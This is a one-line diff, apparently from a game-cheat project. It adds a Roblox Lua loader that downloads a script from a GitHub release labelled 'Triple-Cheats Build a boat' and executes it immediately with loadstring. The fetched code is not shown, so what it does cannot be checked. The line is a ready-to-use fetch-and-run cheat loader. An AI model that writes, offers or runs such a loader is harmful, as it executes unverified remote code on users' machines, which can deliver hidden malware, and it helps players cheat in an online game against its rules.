@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://github.com/andruhacehovskoj-png/Triple-Cheats-----Build-a-boat-V2-/releases/download/buildaboat/Build.A.boat.lua'))()
